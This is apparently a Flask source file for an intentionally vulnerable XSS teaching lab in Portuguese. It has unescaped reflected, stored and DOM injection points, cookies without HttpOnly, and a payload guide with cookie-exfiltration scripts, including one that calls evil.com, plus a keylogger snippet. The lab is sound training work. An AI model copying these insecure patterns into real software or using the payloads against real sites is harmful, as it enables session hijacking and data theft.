"""
╔══════════════════════════════════════════════════════════════╗
║         XSS LAB - Laboratório de Vulnerabilidades XSS        ║
║         APENAS PARA FINS ACADÊMICOS E EDUCACIONAIS           ║
║         NÃO UTILIZAR EM AMBIENTES DE PRODUÇÃO                ║
╚══════════════════════════════════════════════════════════════╝

Este sistema é INTENCIONALMENTE VULNERÁVEL a ataques XSS.
Criado para demonstração acadêmica de:
  - Reflected XSS
  - Stored XSS
  - DOM-based XSS
"""

from flask import Flask, request, render_template_string, make_response, redirect, url_for
import sqlite3
import os

app = Flask(__name__)

# ⚠️ SECRET_KEY fraca — intencional para fins didáticos
app.secret_key = "xsslab123"

DB_PATH = "xsslab.db"

# ─────────────────────────────────────────────
# BANCO DE DADOS
# ─────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS comments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            author TEXT NOT NULL,
            content TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            body TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
    # Dados iniciais
    existing = conn.execute("SELECT COUNT(*) FROM comments").fetchone()[0]
    if existing == 0:
        conn.execute("INSERT INTO comments (author, content) VALUES (?, ?)",
                     ("admin", "Bem-vindo ao XSS Lab! Este é um ambiente de testes."))
        conn.execute("INSERT INTO comments (author, content) VALUES (?, ?)",
                     ("alice", "Ótimo laboratório para estudar segurança web!"))
    conn.commit()
    conn.close()

# ─────────────────────────────────────────────
# TEMPLATE BASE (inline — sem Jinja escaping nas áreas vulneráveis)
# ─────────────────────────────────────────────

BASE_HTML = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS Lab — {title}</title>
  <link rel="stylesheet" href="/static/css/style.css">
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
</head>
<body>
  <div class="scanlines"></div>
  <div class="noise"></div>

  <header>
    <div class="header-inner">
      <div class="logo">
        <span class="logo-bracket">[</span>
        <span class="logo-text">XSS<span class="logo-accent">LAB</span></span>
        <span class="logo-bracket">]</span>
      </div>
      <div class="warning-badge">⚠️ AMBIENTE VULNERÁVEL — APENAS FINS ACADÊMICOS</div>
      <nav>
        <a href="/" class="nav-link">HOME</a>
        <a href="/reflected" class="nav-link">REFLECTED</a>
        <a href="/stored" class="nav-link">STORED</a>
        <a href="/dom" class="nav-link">DOM-BASED</a>
        <a href="/cookie-demo" class="nav-link">COOKIES</a>
        <a href="/guia" class="nav-link nav-highlight">GUIA</a>
      </nav>
    </div>
  </header>

  <main>
    <div class="page-title">
      <h1>{title}</h1>
      <div class="title-line"></div>
    </div>
    {content}
  </main>

  <footer>
    <p>XSS Lab &mdash; Material Acadêmico &mdash; Uso Educacional Exclusivo</p>
  </footer>
  <script src="/static/js/main.js"></script>
</body>
</html>"""

# ─────────────────────────────────────────────
# ROTA: HOME
# ─────────────────────────────────────────────

@app.route("/")
def index():
    content = """
    <div class="home-grid">
      <div class="attack-card" onclick="window.location='/reflected'">
        <div class="card-icon">🔁</div>
        <h2>Reflected XSS</h2>
        <p>O payload é injetado via parâmetro de URL e refletido diretamente na página sem sanitização.</p>
        <div class="card-tag">GET/POST Params</div>
      </div>
      <div class="attack-card" onclick="window.location='/stored'">
        <div class="card-icon">💾</div>
        <h2>Stored XSS</h2>
        <p>O payload é armazenado no banco de dados e executado para todos os usuários que visitam a página.</p>
        <div class="card-tag">SQLite Persistence</div>
      </div>
      <div class="attack-card" onclick="window.location='/dom'">
        <div class="card-icon">🌐</div>
        <h2>DOM-based XSS</h2>
        <p>O payload é processado e injetado no DOM pelo próprio JavaScript do cliente, sem passar pelo servidor.</p>
        <div class="card-tag">Client-Side Only</div>
      </div>
      <div class="attack-card" onclick="window.location='/cookie-demo'">
        <div class="card-icon">🍪</div>
        <h2>Cookie Theft</h2>
        <p>Demonstração de roubo de cookies de sessão através de XSS combinado com exfiltração de dados.</p>
        <div class="card-tag">Session Hijacking</div>
      </div>
    </div>
    <div class="info-box">
      <h3>📚 Sobre este laboratório</h3>
      <p>Este sistema foi criado <strong>propositalmente vulnerável</strong> para demonstração acadêmica de Cross-Site Scripting (XSS).
      Cada seção expõe um vetor de ataque diferente. Utilize o <a href="/guia">Guia de Ataques</a> para payloads prontos.</p>
    </div>
    """
    html = BASE_HTML.format(title="Laboratório XSS", content=content)
    resp = make_response(html)
    # ⚠️ Cookie SEM HttpOnly — vulnerabilidade intencional
    resp.set_cookie("session_token", "TOKEN_SECRETO_ADMIN_XSS123",
                    httponly=False, samesite=None)
    resp.set_cookie("user_role", "admin", httponly=False)
    return resp


# ─────────────────────────────────────────────
# ROTA: REFLECTED XSS
# ─────────────────────────────────────────────

@app.route("/reflected")
def reflected():
    # ⚠️ Parâmetro 'q' inserido DIRETAMENTE no HTML sem sanitização
    query = request.args.get("q", "")
    name  = request.args.get("name", "")
    error = request.args.get("error", "")

    result_block = ""
    if query:
        # VULNERÁVEL: sem escape
        result_block = f"""
        <div class="result-box vuln-box">
          <span class="vuln-label">⚠️ REFLECTED (sem escape)</span>
          <p>Você pesquisou por: <strong>{query}</strong></p>
        </div>"""

    name_block = ""
    if name:
        # VULNERÁVEL: inserido em atributo HTML sem escape
        name_block = f"""
        <div class="result-box vuln-box">
          <span class="vuln-label">⚠️ REFLECTED em atributo HTML</span>
          <input type="text" value="{name}" class="vuln-input" readonly>
          <p>Valor do nome injetado no atributo <code>value</code>.</p>
        </div>"""

    error_block = ""
    if error:
        # VULNERÁVEL: mensagem de erro refletida
        error_block = f"""
        <div class="result-box error-box vuln-box">
          <span class="vuln-label">⚠️ REFLECTED em mensagem de erro</span>
          <p>❌ Erro: {error}</p>
        </div>"""

    content = f"""
    <div class="lab-section">
      <div class="section-meta">
        <span class="badge badge-reflect">REFLECTED XSS</span>
        <p>O servidor recebe o input via URL e o reflete na resposta HTML <strong>sem sanitização</strong>.</p>
      </div>

      <div class="vuln-forms">
        <div class="form-group">
          <label>🔍 Pesquisa (parâmetro <code>?q=</code>)</label>
          <form method="GET">
            <input type="text" name="q" placeholder='Tente: <script>alert("XSS")</script>' class="input-field">
            <button type="submit" class="btn">Pesquisar</button>
          </form>
        </div>

        <div class="form-group">
          <label>👤 Nome de usuário (parâmetro <code>?name=</code> — injetado em atributo)</label>
          <form method="GET">
            <input type="text" name="name" placeholder='Tente: " onmouseover="alert(1)' class="input-field">
            <button type="submit" class="btn">Enviar</button>
          </form>
        </div>

        <div class="form-group">
          <label>❌ Mensagem de erro (parâmetro <code>?error=</code>)</label>
          <form method="GET">
            <input type="text" name="error" placeholder='Tente: <img src=x onerror=alert(document.cookie)>' class="input-field">
            <button type="submit" class="btn">Simular Erro</button>
          </form>
        </div>
      </div>

      {result_block}
      {name_block}
      {error_block}

      <div class="payload-hints">
        <h3>💡 Payloads para testar</h3>
        <code>&lt;script&gt;alert('XSS Reflected')&lt;/script&gt;</code>
        <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code>
        <code>&lt;svg onload=alert(1)&gt;</code>
        <code>" onmouseover="alert('XSS em atributo')" x="</code>
        <code>&lt;body onload=alert('body XSS')&gt;</code>
      </div>
    </div>
    """
    return render_template_string(BASE_HTML.format(title="Reflected XSS", content=content))


# ─────────────────────────────────────────────
# ROTA: STORED XSS
# ─────────────────────────────────────────────

@app.route("/stored", methods=["GET", "POST"])
def stored():
    conn = get_db()
    msg = ""

    if request.method == "POST":
        author  = request.form.get("author", "Anônimo")
        comment = request.form.get("comment", "")
        if comment.strip():
            # ⚠️ VULNERÁVEL: salva HTML/JS cru no banco sem sanitização
            conn.execute("INSERT INTO comments (author, content) VALUES (?, ?)",
                         (author, comment))
            conn.commit()
            msg = "✅ Comentário salvo!"

    # ⚠️ VULNERÁVEL: recupera e renderiza sem escape
    rows = conn.execute("SELECT * FROM comments ORDER BY created_at DESC").fetchall()
    conn.close()

    comments_html = ""
    for row in rows:
        # VULNERÁVEL: sem Markup escape — HTML cru do banco vai direto
        comments_html += f"""
        <div class="comment-card">
          <div class="comment-header">
            <span class="comment-author">{row['author']}</span>
            <span class="comment-date">{row['created_at']}</span>
          </div>
          <div class="comment-body">{row['content']}</div>
        </div>"""

    content = f"""
    <div class="lab-section">
      <div class="section-meta">
        <span class="badge badge-stored">STORED XSS</span>
        <p>O payload é <strong>armazenado no banco</strong> e executado sempre que a página é carregada — afeta todos os visitantes.</p>
      </div>

      <div class="stored-form">
        <h3>💬 Deixar comentário</h3>
        {f'<div class="success-msg">{msg}</div>' if msg else ''}
        <form method="POST">
          <input type="text" name="author" placeholder='Seu nome (tente: <b>hacker</b>)' class="input-field">
          <textarea name="comment" rows="4"
            placeholder='Comentário — tente: &lt;script&gt;alert("Stored XSS!")&lt;/script&gt;'
            class="input-field"></textarea>
          <button type="submit" class="btn btn-danger">Publicar Comentário</button>
        </form>
      </div>

      <div class="payload-hints">
        <h3>💡 Payloads para testar</h3>
        <code>&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</code>
        <code>&lt;img src=x onerror="alert('Cookie: '+document.cookie)"&gt;</code>
        <code>&lt;svg/onload=alert(document.domain)&gt;</code>
        <code>&lt;details open ontoggle=alert(1)&gt;</code>
        <code>&lt;marquee onstart=alert('XSS')&gt;texto&lt;/marquee&gt;</code>
      </div>

      <div class="comments-section">
        <h3>📝 Comentários ({len(rows)})</h3>
        {comments_html if comments_html else '<p class="empty">Nenhum comentário ainda.</p>'}
      </div>

      <form method="POST" action="/stored/clear" style="margin-top:1rem">
        <button type="submit" class="btn btn-sm">🗑️ Limpar comentários</button>
      </form>
    </div>
    """
    return render_template_string(BASE_HTML.format(title="Stored XSS", content=content))


@app.route("/stored/clear", methods=["POST"])
def stored_clear():
    conn = get_db()
    conn.execute("DELETE FROM comments WHERE author != 'admin'")
    conn.commit()
    conn.close()
    return redirect("/stored")


# ─────────────────────────────────────────────
# ROTA: DOM-BASED XSS
# ─────────────────────────────────────────────

@app.route("/dom")
def dom_xss():
    content = """
    <div class="lab-section">
      <div class="section-meta">
        <span class="badge badge-dom">DOM-BASED XSS</span>
        <p>O payload nunca chega ao servidor. O <strong>JavaScript do cliente</strong> lê a URL e injeta o conteúdo no DOM sem sanitização.</p>
      </div>

      <div class="dom-demos">

        <div class="dom-demo-card">
          <h3>🔗 Via <code>location.hash</code></h3>
          <p>Adicione <code>#</code> na URL. Ex: <code>/dom#&lt;img src=x onerror=alert(1)&gt;</code></p>
          <div id="hash-output" class="dom-output">
            <em>Aguardando hash na URL...</em>
          </div>
          <div class="url-builder">
            <input type="text" id="hash-input" placeholder="<script>alert('DOM Hash XSS')</script>" class="input-field">
            <button onclick="applyHash()" class="btn">Testar via Hash</button>
          </div>
        </div>

        <div class="dom-demo-card">
          <h3>🔗 Via <code>location.search</code> (client-side)</h3>
          <p>O JS lê <code>?msg=</code> e injeta via <code>innerHTML</code>. Ex: <code>?msg=&lt;svg onload=alert(1)&gt;</code></p>
          <div id="search-output" class="dom-output">
            <em>Aguardando parâmetro ?msg= na URL...</em>
          </div>
          <div class="url-builder">
            <input type="text" id="search-input" placeholder="<img src=x onerror=alert('DOM Search XSS')>" class="input-field">
            <button onclick="applySearch()" class="btn">Testar via Search</button>
          </div>
        </div>

        <div class="dom-demo-card">
          <h3>⚡ Via <code>document.write()</code></h3>
          <p>Input processado com <code>document.write()</code> — um dos vetores DOM mais perigosos.</p>
          <div class="url-builder">
            <input type="text" id="docwrite-input" placeholder="<b>Olá</b> ou <script>alert('docwrite')</script>" class="input-field">
            <button onclick="doDocWrite()" class="btn">Testar document.write</button>
          </div>
          <iframe id="docwrite-frame" style="width:100%;height:80px;border:1px solid #333;background:#111;border-radius:4px;margin-top:.5rem"></iframe>
        </div>

        <div class="dom-demo-card">
          <h3>⚡ Via <code>eval()</code></h3>
          <p>Entrada passada para <code>eval()</code> — execução arbitrária de código JavaScript.</p>
          <div class="url-builder">
            <input type="text" id="eval-input" placeholder="alert('eval XSS')" class="input-field">
            <button onclick="doEval()" class="btn btn-danger">Executar via eval()</button>
          </div>
        </div>

      </div>

      <div class="payload-hints">
        <h3>💡 Payloads para testar (DOM)</h3>
        <code>/dom#&lt;img src=x onerror=alert(document.cookie)&gt;</code>
        <code>/dom?msg=&lt;svg/onload=alert(1)&gt;</code>
        <code>alert(document.cookie)</code> <small>(para eval)</small>
        <code>document.body.style.background='red'</code> <small>(para eval)</small>
        <code>&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</code>
      </div>
    </div>

    <script src="/static/js/dom-xss.js"></script>
    """
    return render_template_string(BASE_HTML.format(title="DOM-based XSS", content=content))


# ─────────────────────────────────────────────
# ROTA: COOKIE DEMO
# ─────────────────────────────────────────────

@app.route("/cookie-demo")
def cookie_demo():
    # ⚠️ Cookie sem HttpOnly — intencional
    token = request.cookies.get("session_token", "não encontrado")
    role  = request.cookies.get("user_role", "não encontrado")

    # ⚠️ Parâmetro stolen refletido sem sanitização (simula recebimento de cookie roubado)
    stolen = request.args.get("stolen", "")
    stolen_block = ""
    if stolen:
        stolen_block = f"""
        <div class="result-box vuln-box stolen-box">
          <span class="vuln-label">🚨 COOKIE INTERCEPTADO (simulação)</span>
          <p>Dado recebido: <strong>{stolen}</strong></p>
          <p><em>Em um ataque real, este seria o servidor do atacante recebendo seus cookies.</em></p>
        </div>"""

    content = f"""
    <div class="lab-section">
      <div class="section-meta">
        <span class="badge badge-cookie">COOKIE THEFT / SESSION HIJACKING</span>
        <p>Cookies <strong>sem flag HttpOnly</strong> podem ser lidos via JavaScript. XSS permite roubar sessões completas.</p>
      </div>

      <div class="cookie-display">
        <h3>🍪 Cookies atuais desta sessão</h3>
        <div class="cookie-card">
          <div class="cookie-item">
            <span class="cookie-key">session_token</span>
            <span class="cookie-val">{token}</span>
            <span class="cookie-flag flag-vuln">❌ sem HttpOnly</span>
          </div>
          <div class="cookie-item">
            <span class="cookie-key">user_role</span>
            <span class="cookie-val">{role}</span>
            <span class="cookie-flag flag-vuln">❌ sem HttpOnly</span>
          </div>
        </div>
        <p class="cookie-note">⚠️ Estes cookies podem ser lidos com <code>document.cookie</code></p>
      </div>

      <div class="attack-demos">
        <h3>🎯 Simulações de ataque</h3>

        <div class="attack-step">
          <span class="step-num">1</span>
          <div>
            <strong>Ler cookies via JS (console)</strong>
            <p>Abra o console e execute: <code>document.cookie</code></p>
            <button onclick="showCookies()" class="btn">Exibir document.cookie</button>
            <div id="cookie-result" class="dom-output" style="display:none"></div>
          </div>
        </div>

        <div class="attack-step">
          <span class="step-num">2</span>
          <div>
            <strong>Simular exfiltração de cookie</strong>
            <p>Payload típico de roubo: injete no campo de Stored XSS:</p>
            <code class="block-code">&lt;script&gt;
  var img = new Image();
  img.src = '/cookie-demo?stolen=' + encodeURIComponent(document.cookie);
&lt;/script&gt;</code>
            <button onclick="simulateTheft()" class="btn btn-danger">Simular Agora</button>
          </div>
        </div>

        <div class="attack-step">
          <span class="step-num">3</span>
          <div>
            <strong>XSS keylogger (simulação)</strong>
            <p>Demonstra captura de teclas via evento:</p>
            <code class="block-code">&lt;script&gt;
  document.addEventListener('keypress', function(e) {{
    console.log('Tecla: ' + e.key);
  }});
&lt;/script&gt;</code>
            <button onclick="startKeylogger()" class="btn btn-danger">Ativar Keylogger Demo</button>
            <div id="keylog-output" class="dom-output" style="display:none;max-height:80px;overflow:auto"></div>
          </div>
        </div>
      </div>

      {stolen_block}

      <div class="payload-hints">
        <h3>💡 Payloads de roubo de cookie</h3>
        <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
        <code>&lt;img src=x onerror="location='/cookie-demo?stolen='+document.cookie"&gt;</code>
        <code>&lt;script&gt;new Image().src='/cookie-demo?stolen='+btoa(document.cookie)&lt;/script&gt;</code>
      </div>
    </div>
    <script src="/static/js/cookie-demo.js"></script>
    """
    resp = make_response(render_template_string(BASE_HTML.format(title="Cookie Theft Demo", content=content)))
    resp.set_cookie("session_token", "TOKEN_SECRETO_ADMIN_XSS123", httponly=False, samesite=None)
    resp.set_cookie("user_role", "admin", httponly=False)
    return resp


# ─────────────────────────────────────────────
# ROTA: GUIA DE ATAQUES
# ─────────────────────────────────────────────

@app.route("/guia")
def guia():
    content = """
    <div class="lab-section guia-section">
      <div class="section-meta">
        <span class="badge badge-guide">📖 GUIA DE ATAQUES</span>
        <p>Referência rápida de payloads e vetores para cada tipo de XSS demonstrado neste laboratório.</p>
      </div>

      <div class="guia-grid">

        <div class="guia-card">
          <h2>🔁 Reflected XSS</h2>
          <p>Acesse <a href="/reflected">/reflected</a> e use os payloads abaixo nos campos ou na URL:</p>
          <table class="payload-table">
            <tr><th>Payload</th><th>Vetor</th></tr>
            <tr><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>Campo ?q=</td></tr>
            <tr><td><code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></td><td>Campo ?q=</td></tr>
            <tr><td><code>&lt;svg onload=alert('SVG')&gt;</code></td><td>Campo ?q=</td></tr>
            <tr><td><code>" onmouseover="alert(1)" x="</code></td><td>Campo ?name= (atributo)</td></tr>
            <tr><td><code>' onfocus='alert(1)' autofocus='</code></td><td>Campo ?name= (atributo)</td></tr>
            <tr><td><code>&lt;details open ontoggle=alert(1)&gt;</code></td><td>Campo ?error=</td></tr>
          </table>
        </div>

        <div class="guia-card">
          <h2>💾 Stored XSS</h2>
          <p>Acesse <a href="/stored">/stored</a> e insira no campo de comentário:</p>
          <table class="payload-table">
            <tr><th>Payload</th><th>Efeito</th></tr>
            <tr><td><code>&lt;script&gt;alert('Stored!')&lt;/script&gt;</code></td><td>Executa para todos</td></tr>
            <tr><td><code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></td><td>Roubo de cookie</td></tr>
            <tr><td><code>&lt;svg/onload=alert(document.domain)&gt;</code></td><td>Info do domínio</td></tr>
            <tr><td><code>&lt;script&gt;document.body.style.background='red'&lt;/script&gt;</code></td><td>Defacement</td></tr>
            <tr><td><code>&lt;script&gt;new Image().src='/cookie-demo?stolen='+document.cookie&lt;/script&gt;</code></td><td>Exfiltração</td></tr>
            <tr><td><code>&lt;iframe src="javascript:alert('iframe XSS')"&gt;</code></td><td>iframe JS</td></tr>
          </table>
        </div>

        <div class="guia-card">
          <h2>🌐 DOM-based XSS</h2>
          <p>Acesse <a href="/dom">/dom</a> e use os vetores client-side:</p>
          <table class="payload-table">
            <tr><th>URL / Input</th><th>Sink</th></tr>
            <tr><td><code>/dom#&lt;img src=x onerror=alert(1)&gt;</code></td><td>innerHTML (hash)</td></tr>
            <tr><td><code>/dom?msg=&lt;svg onload=alert(1)&gt;</code></td><td>innerHTML (search)</td></tr>
            <tr><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>document.write()</td></tr>
            <tr><td><code>alert(document.cookie)</code></td><td>eval()</td></tr>
            <tr><td><code>document.body.innerHTML='&lt;h1&gt;Hacked&lt;/h1&gt;'</code></td><td>eval()</td></tr>
          </table>
        </div>

        <div class="guia-card">
          <h2>🍪 Cookie Theft</h2>
          <p>Combine com Stored ou Reflected para roubo de sessão:</p>
          <table class="payload-table">
            <tr><th>Payload</th><th>Técnica</th></tr>
            <tr><td><code>alert(document.cookie)</code></td><td>Exibir cookie</td></tr>
            <tr><td><code>new Image().src='/cookie-demo?stolen='+document.cookie</code></td><td>Exfiltrar via GET</td></tr>
            <tr><td><code>fetch('/cookie-demo?stolen='+btoa(document.cookie))</code></td><td>Exfiltrar (base64)</td></tr>
            <tr><td><code>document.cookie='session_token=FAKE'</code></td><td>Cookie poisoning</td></tr>
            <tr><td><code>navigator.sendBeacon('/cookie-demo',document.cookie)</code></td><td>Beacon exfil</td></tr>
          </table>
        </div>

      </div>

      <div class="info-box warning-box">
        <h3>⚖️ Aviso Legal e Ético</h3>
        <p>Este laboratório existe exclusivamente para <strong>fins educacionais e acadêmicos</strong>. 
        O conhecimento sobre vulnerabilidades XSS deve ser usado para <strong>defender sistemas</strong>, 
        nunca para atacar aplicações sem autorização. Aplicar estas técnicas em sistemas reais sem 
        permissão expressa é crime em praticamente todas as jurisdições.</p>
        <p>Para mitigar XSS em aplicações reais: use <strong>CSP (Content Security Policy)</strong>, 
        sempre faça <strong>encoding/escaping</strong> de outputs, utilize bibliotecas como 
        <strong>DOMPurify</strong>, ative flags <strong>HttpOnly e Secure</strong> nos cookies.</p>
      </div>
    </div>
    """
    return render_template_string(BASE_HTML.format(title="Guia de Ataques XSS", content=content))


# ─────────────────────────────────────────────
# ENDPOINT: Receber dados exfiltrados (simulação)
# ─────────────────────────────────────────────

@app.route("/collect")
def collect():
    data = request.args.get("data", "")
    print(f"[XSS LAB] Dados recebidos (simulação exfiltração): {data}")
    return "", 204


if __name__ == "__main__":
    init_db()
    print("""
╔══════════════════════════════════════════════════════════╗
║  XSS Lab iniciado em http://localhost:5000               ║
║  APENAS PARA FINS ACADÊMICOS — NÃO USE EM PRODUÇÃO      ║
╚══════════════════════════════════════════════════════════╝
    """)
    app.run(debug=True, host="0.0.0.0", port=5000)
